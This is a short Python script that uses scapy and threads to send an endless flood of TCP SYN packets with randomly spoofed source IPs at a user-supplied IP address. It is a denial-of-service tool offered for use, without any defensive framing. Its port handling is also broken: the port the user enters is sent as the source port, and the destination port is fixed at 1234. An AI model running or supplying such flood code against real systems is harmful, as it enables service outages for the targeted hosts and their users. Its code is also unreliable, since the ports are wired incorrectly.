from scapy.all import *
import threading

ip = input("IP: ")
port = int(input("Port: "))
thr = int(input("Thread: "))

def tcp_syn(ip_adress, sport, dport, i):

    while(True):
        print("Thread: ", i)
        s_address = RandIP()
        d_adress = ip_adress
        packet = IP(src=s_address, dst=d_adress)/TCP(sport=sport, dport=dport, seq=1255066, flags="S")
        send(packet)


thrList = list ()

for i in range (thr) :
    thrSyn = threading.Thread(target = tcp_syn, args = (ip, port, 1234, i,))
    thrList.append(thrSyn)
    thrSyn.start()